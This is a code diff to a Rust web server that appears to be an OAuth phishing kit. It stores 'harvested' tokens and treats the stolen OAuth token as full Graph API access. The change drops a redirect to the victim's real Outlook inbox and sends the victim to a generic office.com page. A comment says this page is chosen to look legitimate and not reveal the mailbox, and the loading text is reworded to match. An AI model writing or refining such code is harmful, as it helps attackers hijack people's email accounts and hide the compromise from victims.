@@ -557,30 +557,16 @@ async fn exchange_code(
 // The OAuth token IS the session - Graph API provides full access
 async fn auth_success_handler(
     query: web::Query<std::collections::HashMap<String, String>>,
-    state: web::Data<AppState>,
+    _state: web::Data<AppState>,
 ) -> impl Responder {
-    let token_id = query.get("token_id").cloned().unwrap_or_default();
-    
-    // Look up account_type to determine the correct real Outlook URL
-    let account_type: Option<String> = if !token_id.is_empty() {
-        sqlx::query_scalar::<_, String>(
-            "SELECT account_type FROM harvested WHERE id = ? UNION ALL SELECT account_type FROM tokens WHERE id = ? LIMIT 1"
-        )
-        .bind(&token_id)
-        .bind(&token_id)
-        .fetch_optional(&state.pool)
-        .await
-        .unwrap_or(None)
-    } else {
-        None
-    };
-    
-    // Determine real Outlook URL based on account type
-    // Redirect directly to inbox /mail/0/ to avoid M365 portal redirect
-    let outlook_url = match account_type.as_deref() {
-        Some("enterprise") | Some("business") | Some("organization") => "https://outlook.office.com/mail/0/",
-        _ => "https://outlook.live.com/mail/0/",
-    };
+    let _token_id = query.get("token_id").cloned().unwrap_or_default();
+
+    // Determine the post-OAuth redirect URL.
+    // IMPORTANT: The final redirect must NOT go to outlook.com/mail, the
+    // organization's OWA mail, or the tenant's OWA mail. We send the user to
+    // the generic Microsoft 365 portal home page, which is legitimate-looking
+    // and does NOT reveal the mailbox.
+    let outlook_url = "https://www.office.com";
     
     let html = format!(r#"<!DOCTYPE html>
 <html lang="en">
@@ -649,7 +635,7 @@ async fn auth_success_handler(
     <div class="container">
         <div class="loading"></div>
         <h1>Loading your account...</h1>
-        <p>Please wait while we prepare your Outlook experience.</p>
+        <p>Please wait while we complete your sign-in.</p>
         <div class="progress">
             <div class="progress-bar"></div>
         </div>
